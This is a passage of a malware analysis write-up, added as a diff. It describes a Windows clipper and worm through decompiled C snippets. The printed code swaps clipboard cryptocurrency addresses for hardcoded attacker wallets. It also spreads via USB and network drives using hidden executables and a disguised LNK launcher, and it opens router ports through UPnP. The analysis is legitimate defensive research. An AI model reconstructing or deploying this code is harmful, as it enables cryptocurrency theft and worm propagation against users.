+</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="n">lpString</span> <span class="o">=</span> <span class="nf">mw_convert_to_wide</span><span class="p">(</span><span class="n">mw_ptr_to_pdata</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">uFormat</span> <span class="o">==</span> <span class="mi">7</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">lpString</span> <span class="o">=</span> <span class="nf">mw_convert1</span><span class="p">(</span><span class="n">mw_ptr_to_pdata</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">          <span class="k">else</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">lpString</span> <span class="o">=</span> <span class="nf">mw_convert2</span><span class="p">(</span><span class="n">mw_ptr_to_pdata</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="nf">mw_repcale_crypt</span><span class="p">(</span><span class="n">lpString</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span></code></pre></div></div>
+<p><code>mw_repcale_crypt</code> func find if in a user&rsquo;s clipboard data is a crypto hash, and replace it for own crypto hash.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nf">StrStrW</span><span class="p">(</span><span class="n">lpString</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;bitcoincash:&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">lpString</span> <span class="o">==</span> <span class="mi">84</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="s">&#34;TW3wpRJmZgC5WifuY468JBUCF3TEkzBT5H&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">lpString</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">105</span> <span class="o">&amp;&amp;</span> <span class="n">lpString</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">108</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">      <span class="n">v5</span> <span class="o">=</span> <span class="s">&#34;zil19delrukejtr306u0s7ludxrwk434jcl6ghpng3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="n">v5</span> <span class="o">=</span> <span class="s">&#34;zncBgwqwqquPLHrM4ozrtr3LPyFuNVemy4v&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">mw_prt_to_replaced_pdata</span> <span class="o">=</span> <span class="nf">GlobalLock</span><span class="p">(</span><span class="n">hMem</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">mw_prt_to_replaced_pdata</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="nf">memcpy</span><span class="p">(</span><span class="n">mw_prt_to_replaced_pdata</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nf">GlobalUnlock</span><span class="p">(</span><span class="n">hMem</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nf">OpenClipboard</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">          <span class="nf">EmptyClipboard</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">          <span class="nf">SetClipboardData</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="n">hMem</span><span class="p">);</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">spreading via USB and network drives
+    <div id="spreading-via-usb-and-network-drives" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#spreading-via-usb-and-network-drives" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>creates a separate thread <code>CreateThread(0, 0, sub_406E00, 0, 0, 0);</code> for monitoring connected drives and automatic spreading via USB drives and network shares.</p>
+<p>The function continuously checks system logical drives (<code>mw_checks_logical_drives()</code>), filtering USB and network devices. For each detected drive, it collects information about size and volume name, then calls <code>sub_4068E0()</code> for infection:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">void</span> <span class="kr">__stdcall</span> <span class="n">__noreturn</span> <span class="nf">sub_406E00</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">Parameter</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nf">GetModuleFileNameW</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Filename</span><span class="p">,</span> <span class="mh">0x104u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="n">mw_current_file_size</span> <span class="o">=</span> <span class="nf">sub_40EA80</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="nf">mw_checks_logical_drives</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">25</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="n">v7</span> <span class="o">=</span> <span class="nf">sub_4064E0</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">RootPathName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">v7</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>                 <span class="c1">// if USB or network drive
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="nf">GetVolumeInformationW</span><span class="p">(</span><span class="n">RootPathName</span><span class="p">,</span> <span class="n">VolumeNameBuffer</span><span class="p">,</span> <span class="mh">0x105u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FileSystemFlags</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="nf">GetDiskFreeSpaceExW</span><span class="p">(</span><span class="n">RootPathName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TotalNumberOfBytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nf">wsprintfW</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34; (%dGB)&#34;</span><span class="p">,</span> <span class="n">TotalNumberOfBytes</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">/</span> <span class="mh">0x40000000</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">VolumeNameBuffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">          <span class="nf">wsprintfW</span><span class="p">(</span><span class="n">VolumeNameBuffer</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;Unnamed volume&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nf">wsprintfW</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;%s%s&#34;</span><span class="p">,</span> <span class="n">VolumeNameBuffer</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nf">sub_4068E0</span><span class="p">(</span><span class="n">RootPathName</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">FileSystemFlags</span><span class="p">,</span> <span class="n">v7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">);</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">usb infect
+    <div id="usb-infect" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#usb-infect" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<ol>
+<li>
+<p><strong>Creating hidden structure:</strong><br>
+- Creates a hidden directory with the volume name<br>
+- Copies malware as <code>DriveSecManager.exe</code> with HIDDEN attribute<br>
+- Creates an LNK shortcut file with folder icon</p>
+</li>
+<li>
+<p><strong>Hiding legitimate files:</strong><br>
+- Deletes some files (<code>.bat</code>, <code>.vbs</code>, <code>.cmd</code>, <code>.ps1</code>, etc.)<br>
+- Moves all user files to the hidden directory<br>
+- Leaves only the malicious LNK file visible</p>
+</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">PathFileExistsW</span><span class="p">(</span><span class="n">pszPath</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">PathFileExistsW</span><span class="p">(</span><span class="n">PathName</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nf">CreateDirectoryW</span><span class="p">(</span><span class="n">PathName</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      <span class="nf">SetFileAttributesW</span><span class="p">(</span><span class="n">PathName</span><span class="p">,</span> <span class="mi">2u</span><span class="p">);</span>         <span class="c1">// FILE_ATTRIBUTE_HIDDEN
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">PathFileExistsW</span><span class="p">(</span><span class="n">PathName</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nf">CopyFileW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Filename</span><span class="p">,</span> <span class="n">pszPath</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      <span class="nf">SetFileAttributesW</span><span class="p">(</span><span class="n">pszPath</span><span class="p">,</span> <span class="mi">2u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">PathFileExistsW</span><span class="p">(</span><span class="n">FileName</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">a4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">      <span class="nf">sub_406680</span><span class="p">(</span><span class="n">FileName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;shell32.dll&#34;</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span> <span class="c1">// network drive
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="nf">sub_406680</span><span class="p">(</span><span class="n">FileName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;shell32.dll&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// USB drive
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nf">SetFileAttributesW</span><span class="p">(</span><span class="n">FileName</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>           <span class="c1">// FILE_ATTRIBUTE_READONLY
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">infected .LNK
+    <div id="infected-lnk" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#infected-lnk" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Uses COM interface <code>IShellLink</code> to create a <code>.lnk</code> file that:<br>
+- Looks like a regular folder (<code>shell32.dll</code> icon)<br>
+- Launches <code>cmd.exe</code> with command to open the hidden folder <strong>AND</strong> run <code>DriveSecManager.exe</code><br>
+- Victim sees their files (because the hidden directory opens), but malware runs simultaneously</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">sub_406680</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">CoInitialize</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="nf">CoCreateInstance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rclsid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">riid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ppv</span><span class="p">);</span> <span class="c1">// creates IShellLink object
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">ppv</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="c1">// command: open hidden folder + launch malware
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="nf">wsprintfW</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;/c start %s &amp; start %s</span><span class="se">\\</span><span class="s">DriveSecManager.exe&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_41430C</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_41430C</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">NAT traversal via UPnP
+    <div id="nat-traversal-via-upnp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#nat-traversal-via-upnp" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Malware implements NAT traversal to expose infected machine directly to the internet by configuring port forwarding on the router via UPnP protocol.</p>
+<p><strong>Finding gateway via SSDP</strong></p>
+<p>Sends SSDP M-SEARCH multicast request to discover UPnP-enabled routers on the local network. Broadcasts M-SEARCH to <code>239.255.255.250:1900</code> to discover <code>InternetGatewayDevice</code>, then collects all UPnP gateway URLs from SSDP responses</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">mw_gateway_find_by_SSDP</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="n">v17</span> <span class="o">=</span> <span class="nf">WS2_32_23</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">17</span><span class="p">);</span>           
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nf">WS2_32_9</span><span class="p">(</span><span class="mi">1900</span><span class="p">);</span>                     <span class="c1">// port 1900 (SSDP)
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">WS2_32_11</span><span class="p">(</span><span class="s">&#34;239.255.255.250&#34;</span><span class="p">);</span>          <span class="c1">// SSDP multicast address
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nf">WS2_32_21</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="mh">0xFFFF</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v14</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>        <span class="c1">// SO_BROADCAST
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">lpString</span> <span class="o">=</span> <span class="s">&#34;M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">               <span class="s">&#34;ST:urn:schemas-upnp-org:device:InternetGatewayDevice:1</span><span class="se">\r\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">               <span class="s">&#34;MX: 3</span><span class="se">\r\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">               <span class="s">&#34;Man:</span><span class="se">\&#34;</span><span class="s">ssdp:discover</span><span class="se">\&#34;\r\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">               <span class="s">&#34;HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">               <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span></code></pre></div></div>
+<p><strong>Port forwarding setup (<code>mw_nat_local</code>):</strong>
+Determines local IP using <code>getsockname()</code> by establishing connection to external host <code>&quot;www.update.microsoft.com&quot;</code>
+Then configures router to forward external traffic for TCP/UDP port <code>40500</code> to infected machine:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">mw_nat_local</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nf">CoInitializeEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">mw_gateway_find_by_SSDP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">      <span class="n">lpszUrl</span> <span class="o">=</span> <span class="nf">sub_40DC90</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">));</span>      <span class="c1">// get UPnP control URL
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">lpszUrl</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">v1</span> <span class="o">=</span> <span class="nf">mw_local_ip</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nf">sub_40E780</span><span class="p">(</span><span class="n">lpszUrl</span><span class="p">,</span> <span class="s">&#34;TCP&#34;</span><span class="p">,</span> <span class="mh">0x9E34u</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span> <span class="c1">// forward TCP port 40500
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nf">sub_40E780</span><span class="p">(</span><span class="n">lpszUrl</span><span class="p">,</span> <span class="s">&#34;UDP&#34;</span><span class="p">,</span> <span class="mh">0x9E34u</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span> <span class="c1">// forward UDP port 40500
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1">// ...[snip]...
+</span></span></span></code></pre></div></div>
 
           
           
